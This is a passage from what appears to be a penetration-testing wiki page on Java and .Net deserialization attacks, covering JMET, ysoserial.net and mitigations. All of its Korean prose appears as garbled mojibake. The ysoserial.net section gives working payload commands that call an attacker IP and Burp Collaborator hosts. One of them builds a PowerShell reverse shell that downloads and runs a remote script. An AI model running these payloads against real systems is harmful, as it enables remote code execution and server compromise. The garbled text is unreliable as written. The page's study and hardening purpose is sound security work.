**í–¥ìƒëœ ë³´ì•ˆì„ ìœ„í•œ ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ í™œìš©**: **NotSoSerial**, **jdeserialize**, **Kryo**ì™€ ê°™ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” Java ì—­ì§ë ¬í™”ë¥¼ ì œì–´í•˜ê³  ëª¨ë‹ˆí„°ë§í•˜ê¸° ìœ„í•œ ê³ ê¸‰ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” í´ë˜ìŠ¤ì˜ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ë˜ëŠ” ë¸”ë™ë¦¬ìŠ¤íŠ¸, ì—­ì§ë ¬í™” ì „ì— ì§ë ¬í™”ëœ ê°ì²´ ë¶„ì„, ì‚¬ìš©ì ì •ì˜ ì§ë ¬í™” ì „ëµ êµ¬í˜„ê³¼ ê°™ì€ ì¶”ê°€ì ì¸ ë³´ì•ˆ ê³„ì¸µì„ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **NotSoSerial**ì€ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œì˜ ì‹¤í–‰ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ë¥¼ ê°€ë¡œì±•ë‹ˆë‹¤.
- **jdeserialize**ëŠ” ì—­ì§ë ¬í™”í•˜ì§€ ì•Šê³  ì§ë ¬í™”ëœ Java ê°ì²´ë¥¼ ë¶„ì„í•  ìˆ˜ ìˆì–´ ì ì¬ì ìœ¼ë¡œ ì•…ì„± ì½˜í…ì¸ ë¥¼ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.
- **Kryo**ëŠ” ì†ë„ì™€ íš¨ìœ¨ì„±ì„ ê°•ì¡°í•˜ëŠ” ëŒ€ì²´ ì§ë ¬í™” í”„ë ˆì„ì›Œí¬ë¡œ, ë³´ì•ˆì„ ê°•í™”í•  ìˆ˜ ìˆëŠ” êµ¬ì„± ê°€ëŠ¥í•œ ì§ë ¬í™” ì „ëµì„ ì œê³µí•©ë‹ˆë‹¤.


### ì°¸ê³  ìë£Œ

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialization ë° ysoserialì— ëŒ€í•œ ì´ì•¼ê¸°: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* gadgetinspectorì— ëŒ€í•œ ì´ì•¼ê¸°: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ë° ìŠ¬ë¼ì´ë“œ: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec ë…¼ë¬¸: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java ë° .Net JSON ì—­ì§ë ¬í™” **ë…¼ë¬¸:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ì´ì•¼ê¸°: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ë° ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* ì—­ì§ë ¬í™” CVE: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

ë‹¤ìŒ í˜ì´ì§€ì—ì„œ **JNDI Injection, RMI, CORBA ë° LDAPë¥¼ í†µí•œ ì•…ìš© ë°©ë²• ë° log4shell ì·¨ì•½ì ì„ ì–´ë–»ê²Œ ì´ìš©í•˜ëŠ”ì§€** (ì´ ì·¨ì•½ì ì˜ ì˜ˆ) ì°¾ì•„ë³´ì„¸ìš”:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) APIëŠ” ë‘ ê°œ ì´ìƒì˜ í´ë¼ì´ì–¸íŠ¸ ê°„ì— ë©”ì‹œì§€ë¥¼ ì „ì†¡í•˜ê¸° ìœ„í•œ Java ë©”ì‹œì§€ ì§€í–¥ ë¯¸ë“¤ì›¨ì–´ APIì…ë‹ˆë‹¤. ì´ëŠ” ìƒì‚°ì-ì†Œë¹„ì ë¬¸ì œë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ êµ¬í˜„ì²´ì…ë‹ˆë‹¤. JMSëŠ” Java Platform, Enterprise Edition (Java EE)ì˜ ì¼ë¶€ì´ë©°, Sun Microsystemsì—ì„œ ê°œë°œí•œ ëª…ì„¸ì— ë”°ë¼ Java Community Processì— ì˜í•´ ì§€ì›ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” Java EEë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•œ ì‘ìš© í”„ë¡œê·¸ë¨ êµ¬ì„± ìš”ì†Œê°€ ë©”ì‹œì§€ë¥¼ ìƒì„±, ì „ì†¡, ìˆ˜ì‹  ë° ì½ì„ ìˆ˜ ìˆëŠ” ë©”ì‹œì§• í‘œì¤€ì…ë‹ˆë‹¤. ë¶„ì‚° ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ë‹¤ë¥¸ êµ¬ì„± ìš”ì†Œ ê°„ì˜ í†µì‹ ì„ ëŠìŠ¨í•˜ê²Œ ê²°í•©í•˜ê³  ì‹ ë¢°ì„± ìˆê³  ë¹„ë™ê¸°ì ìœ¼ë¡œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ì¶œì²˜: [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### ì œí’ˆ

ì´ ë¯¸ë“¤ì›¨ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë©”ì‹œì§€ë¥¼ ì „ì†¡í•˜ëŠ” ì—¬ëŸ¬ ì œí’ˆì´ ìˆìŠµë‹ˆë‹¤:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (291).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (292).png>)

### ê³µê²©

ë”°ë¼ì„œ, ê¸°ë³¸ì ìœ¼ë¡œ **JMSë¥¼ ìœ„í—˜í•˜ê²Œ ì‚¬ìš©í•˜ëŠ” ì—¬ëŸ¬ ì„œë¹„ìŠ¤ê°€ ìˆìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ì— ë©”ì‹œì§€ë¥¼ ë³´ë‚´ëŠ” ë° ì¶©ë¶„í•œ ê¶Œí•œì´ ìˆë‹¤ë©´ (ì¼ë°˜ì ìœ¼ë¡œ ìœ íš¨í•œ ìê²© ì¦ëª…ì´ í•„ìš”í•©ë‹ˆë‹¤) **ì§ë ¬í™”ëœ ì•…ì„± ê°ì²´ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì†Œë¹„ì/êµ¬ë…ìì— ì˜í•´ ì—­ì§ë ¬í™”ë  ê²ƒì…ë‹ˆë‹¤**.\
ì´ëŠ” ì´ ê³µê²©ì—ì„œ í•´ë‹¹ ë©”ì‹œì§€ë¥¼ ì‚¬ìš©í•˜ëŠ” **ëª¨ë“  í´ë¼ì´ì–¸íŠ¸ê°€ ê°ì—¼ë  ê²ƒ**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ì„œë¹„ìŠ¤ê°€ ì·¨ì•½í•˜ë”ë¼ë„ (ì‚¬ìš©ì ì…ë ¥ì„ ì•ˆì „í•˜ê²Œ ì—­ì§ë ¬í™”í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì—) ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ìœ íš¨í•œ ê°€ì ¯ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.

ë„êµ¬ [JMET](https://github.com/matthiaskaiser/jmet)ì€ ì•Œë ¤ì§„ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”ëœ ì—¬ëŸ¬ ì•…ì„± ê°ì²´ë¥¼ ë³´ë‚´ê³  ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ì— ì—°ê²°í•˜ì—¬ ê³µê²©í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ ì„œë¹„ìŠ¤ê°€ ì—¬ì „íˆ ì·¨ì•½í•˜ê³  ì‚¬ìš©ëœ ê°€ì ¯ ì¤‘ í•˜ë‚˜ê°€ ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì— ì¡´ì¬í•˜ëŠ” ê²½ìš°ì—ë§Œ ì‘ë™í•©ë‹ˆë‹¤.

### ì°¸ê³  ìë£Œ

* JMET ì´ì•¼ê¸°: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Netì˜ ë¬¸ë§¥ì—ì„œ ì—­ì§ë ¬í™” ì·¨ì•½ì ì€ Javaì—ì„œ ë°œê²¬ë˜ëŠ” ê²ƒê³¼ ìœ ì‚¬í•œ ë°©ì‹ìœ¼ë¡œ ì‘ë™í•˜ë©°, ê°€ì ¯ì„ ì•…ìš©í•˜ì—¬ ê°ì²´ì˜ ì—­ì§ë ¬í™” ì¤‘ì— íŠ¹ì • ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
### ì§€ë¬¸

#### WhiteBox

ì†ŒìŠ¤ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì€ í•­ëª©ì„ ê²€ì‚¬í•´ì•¼ í•©ë‹ˆë‹¤:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

ì£¼ëª©í•´ì•¼ í•  ê²ƒì€ ì‚¬ìš©ìê°€ ì œì–´í•˜ëŠ” ë³€ìˆ˜ì— ë”°ë¼ ìœ í˜•ì„ ê²°ì •í•  ìˆ˜ ìˆëŠ” ì§ë ¬í™”ê¸°ì…ë‹ˆë‹¤.

#### BlackBox

ê²€ìƒ‰ ëŒ€ìƒì€ ì„œë²„ ì¸¡ì—ì„œ ì—­ì§ë ¬í™”ë  ìˆ˜ ìˆëŠ” Base64ë¡œ ì¸ì½”ë”©ëœ ë¬¸ìì—´ **AAEAAAD/////** ë˜ëŠ” ìœ ì‚¬í•œ íŒ¨í„´ì…ë‹ˆë‹¤. ì´ëŠ” `TypeObject` ë˜ëŠ” `$type`ì„ í¬í•¨í•˜ëŠ” **JSON** ë˜ëŠ” **XML** êµ¬ì¡°ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ysoserial.net

ì´ ê²½ìš°ì—ëŠ” [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì—­ì§ë ¬í™” ê³µê²©ì„ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. git ì €ì¥ì†Œë¥¼ ë‹¤ìš´ë¡œë“œí•œ í›„ì—ëŠ” Visual Studioë¥¼ ì‚¬ìš©í•˜ì—¬ ë„êµ¬ë¥¼ **ì»´íŒŒì¼**í•´ì•¼ í•©ë‹ˆë‹¤.

**ysoserial.netì´ ì–´ë–»ê²Œ ê³µê²©ì„ ìƒì„±í•˜ëŠ”ì§€ ì•Œê³  ì‹¶ë‹¤ë©´** [**ì´ í˜ì´ì§€ì—ì„œ ObjectDataProvider ê°€ì ¯ + ExpandedWrapper + Json.Net í¬ë§¤í„°ì— ëŒ€í•´ ì„¤ëª…ëœ ë‚´ìš©ì„ í™•ì¸**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ysoserial.net**ì˜ ì£¼ìš” ì˜µì…˜ì€ **`--gadget`**, **`--formatter`**, **`--output`** ë° **`--plugin`**ì…ë‹ˆë‹¤.

* **`--gadget`**ì€ ë‚¨ìš©í•  ê°€ì ¯ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤(ì—­ì§ë ¬í™” ì¤‘ì— ëª…ë ¹ì„ ì‹¤í–‰í•  í´ë˜ìŠ¤/í•¨ìˆ˜ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤).
* **`--formatter`**ëŠ” ê³µê²©ì„ ì§ë ¬í™”í•˜ëŠ” ë°©ë²•ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤(í˜ì´ë¡œë“œë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë°±ì—”ë“œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•Œì•„ì•¼ í•˜ë©°, ë™ì¼í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”í•´ì•¼ í•©ë‹ˆë‹¤).
* **`--output`**ì€ ê³µê²©ì„ **raw** ë˜ëŠ” **base64**ë¡œ ì¸ì½”ë”©í• ì§€ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. _ì°¸ê³ ë¡œ **ysoserial.net**ì€ í˜ì´ë¡œë“œë¥¼ **UTF-16LE**(Windowsì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ì¸ì½”ë”©)ë¡œ ì¸ì½”ë”©í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ë¦¬ëˆ…ìŠ¤ ì½˜ì†”ì—ì„œ ì¸ì½”ë”©ë§Œ ìˆ˜í–‰í•˜ë©´ **ì¸ì½”ë”© í˜¸í™˜ì„± ë¬¸ì œ**ê°€ ë°œìƒí•˜ì—¬ ê³µê²©ì´ ì œëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(HTB JSON ìƒìì—ì„œ í˜ì´ë¡œë“œëŠ” UTF-16LE ë° ASCIIì—ì„œ ëª¨ë‘ ì‘ë™í–ˆì§€ë§Œ í•­ìƒ ì‘ë™í•œë‹¤ëŠ” ì˜ë¯¸ëŠ” ì•„ë‹™ë‹ˆë‹¤)._
* **`--plugin`** ysoserial.netì€ ViewStateì™€ ê°™ì€ **íŠ¹ì • í”„ë ˆì„ì›Œí¬ì— ëŒ€í•œ ê³µê²©ì„ ìƒì„±**í•˜ê¸° ìœ„í•´ í”ŒëŸ¬ê·¸ì¸ì„ ì§€ì›í•©ë‹ˆë‹¤.

#### ì¶”ê°€ ysoserial.net ë§¤ê°œë³€ìˆ˜

* `--minify`ëŠ” **ë” ì‘ì€ í˜ì´ë¡œë“œ**ë¥¼ ì œê³µí•©ë‹ˆë‹¤(ê°€ëŠ¥í•œ ê²½ìš°).
* `--raf -f Json.Net -c "anything"` ì´ë ‡ê²Œ í•˜ë©´ ì œê³µëœ í¬ë§¤í„°(`Json.Net`ì¸ ê²½ìš°)ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ê°€ì ¯ì´ í‘œì‹œë©ë‹ˆë‹¤.
* `--sf xml`ì€ ê°€ì ¯(`-g`)ì„ ì§€ì •í•  ìˆ˜ ìˆìœ¼ë©°, ysoserial.netì€ "xml"ì„ í¬í•¨í•˜ëŠ” í¬ë§¤í„°ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤(ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ìŒ).

**ysoserial ì˜ˆì œ**ë¥¼ ì‚¬ìš©í•˜ì—¬ ê³µê²© ìƒì„±:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net**ì—ëŠ” ê° exploitì´ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë” ì˜ ì´í•´í•  ìˆ˜ ìˆë„ë¡ ë„ì™€ì£¼ëŠ” ë§¤ìš° í¥ë¯¸ë¡œìš´ ë§¤ê°œ ë³€ìˆ˜ì¸ `--test`ê°€ ìˆìŠµë‹ˆë‹¤.\
ì´ ë§¤ê°œ ë³€ìˆ˜ë¥¼ ì§€ì •í•˜ë©´ **ysoserial.net**ì´ ë¡œì»¬ì—ì„œ exploitì„ ì‹œë„í•˜ë¯€ë¡œ í˜ì´ë¡œë“œê°€ ì˜¬ë°”ë¥´ê²Œ ì‘ë™í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ë§¤ê°œ ë³€ìˆ˜ëŠ” ìœ ìš©í•©ë‹ˆë‹¤. ì½”ë“œë¥¼ ê²€í† í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œ ì²­í¬ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤([ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)ì—ì„œ ê°€ì ¸ì˜´):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
ì´ëŠ” exploitì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ì½”ë“œê°€ [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)ë¥¼ í˜¸ì¶œí•œë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**ì´ì „ ì½”ë“œëŠ” ìƒì„±ëœ ì•…ìš©ì— ì·¨ì•½í•©ë‹ˆë‹¤**. ë”°ë¼ì„œ .Net ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ìœ ì‚¬í•œ ê²ƒì„ ì°¾ìœ¼ë©´ í•´ë‹¹ ì• í”Œë¦¬ì¼€ì´ì…˜ë„ ì·¨ì•½í•  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ **`--test`** ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´ **ysoserial.net**ì´ ìƒì„±í•  ìˆ˜ ìˆëŠ” ì—­ì§ë ¬í™” ì•…ìš©ì— ì·¨ì•½í•œ **ì–´ë–¤ ì½”ë“œ ì²­í¬ì¸ì§€ ì´í•´**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ViewState

[**.Netì˜ \_\_ViewState ë§¤ê°œë³€ìˆ˜ë¥¼ ì•…ìš©í•´ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•**ì— ëŒ€í•œ ì´ POSTë¥¼ ì‚´í´ë³´ì„¸ìš”](exploiting-\_\_viewstate-parameter.md)**.** í”¼í•´ ê¸°ê³„ì—ì„œ ì‚¬ìš©ë˜ëŠ” **ë¹„ë°€ì„ ì´ë¯¸ ì•Œê³  ìˆë‹¤ë©´, ì´ í¬ìŠ¤íŠ¸ë¥¼ ì½ì–´ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### ì˜ˆë°©

.Netì—ì„œ ì—­ì§ë ¬í™”ì™€ ê´€ë ¨ëœ ìœ„í—˜ì„ ì™„í™”í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ìˆ˜í–‰í•˜ì„¸ìš”:

- **ë°ì´í„° ìŠ¤íŠ¸ë¦¼ì´ ê°ì²´ ìœ í˜•ì„ ì •ì˜í•˜ì§€ ëª»í•˜ë„ë¡ í—ˆìš©í•˜ì§€ ë§ˆì„¸ìš”**. ê°€ëŠ¥í•œ ê²½ìš° `DataContractSerializer` ë˜ëŠ” `XmlSerializer`ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.

- **`JSON.Net`ì˜ ê²½ìš° `TypeNameHandling`ì„ `None`ìœ¼ë¡œ ì„¤ì •í•˜ì„¸ìš”**: 
%%%TypeNameHandling = TypeNameHandling.None%%%

- **`JavaScriptSerializer`ì™€ `JavaScriptTypeResolver`ë¥¼ í•¨ê»˜ ì‚¬ìš©í•˜ì§€ ë§ˆì„¸ìš”**.

- **ì—­ì§ë ¬í™”í•  ìˆ˜ ìˆëŠ” ìœ í˜•ì„ ì œí•œ**í•˜ê³ , `System.IO.FileInfo`ì™€ ê°™ì€ .Net ìœ í˜•ì˜ ë‚´ì¬ì ì¸ ìœ„í—˜ì„ ì´í•´í•˜ì„¸ìš”. ì´ ìœ í˜•ì€ ì„œë²„ íŒŒì¼ì˜ ì†ì„±ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìœ¼ë©°, ê±°ë¶€ ì„œë¹„ìŠ¤ ê³µê²©ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **ìœ„í—˜í•œ ì†ì„±ì„ ê°€ì§„ ìœ í˜•ì— ì£¼ì˜í•˜ì„¸ìš”**. ì˜ˆë¥¼ ë“¤ì–´ `System.ComponentModel.DataAnnotations.ValidationException`ì˜ `Value` ì†ì„±ì€ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **ì•…ì˜ì ì¸ ì˜í–¥ì„ ë°›ì§€ ì•Šë„ë¡ ìœ í˜• ì¸ìŠ¤í„´ìŠ¤í™”ë¥¼ ì•ˆì „í•˜ê²Œ ì œì–´**í•˜ì—¬ ì‹¬ì§€ì–´ `DataContractSerializer` ë˜ëŠ” `XmlSerializer`ë„ ì·¨ì•½í•´ì§€ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤.

- `BinaryFormatter` ë° `JSON.Net`ì— ëŒ€í•´ ì‚¬ìš©ì ì •ì˜ `SerializationBinder`ë¥¼ ì‚¬ìš©í•˜ì—¬ **í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ì»¨íŠ¸ë¡¤ì„ êµ¬í˜„**í•˜ì„¸ìš”.

- .Net ë‚´ì—ì„œ ì•Œë ¤ì§„ ì·¨ì•½í•œ ì—­ì§ë ¬í™” ê°€ì ¯ì— ëŒ€í•´ **ì •ë³´ë¥¼ íŒŒì•…**í•˜ê³ , ì—­ì§ë ¬í™”ê¸°ê°€ í•´ë‹¹ ìœ í˜•ì„ ì¸ìŠ¤í„´ìŠ¤í™”í•˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤.

- ì•Œë ¤ì§„ ê°€ì ¯ì„ ë…¸ì¶œí•˜ì§€ ì•Šë„ë¡ **ì¸í„°ë„· ì•¡ì„¸ìŠ¤ê°€ ìˆëŠ” ì½”ë“œì—ì„œ ì ì¬ì ìœ¼ë¡œ ìœ„í—˜í•œ ì½”ë“œë¥¼ ê²©ë¦¬**í•˜ì„¸ìš”. ì˜ˆë¥¼ ë“¤ì–´ WPF ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ `System.Windows.Data.ObjectDataProvider`ë¥¼ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ë°ì´í„° ì†ŒìŠ¤ì— ë…¸ì¶œí•˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤.

### **ì°¸ê³  ìë£Œ**

* Java ë° .Net JSON ì—­ì§ë ¬í™” **ë…¼ë¬¸**: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ë°œí‘œ: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ë° ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **ë£¨ë¹„**

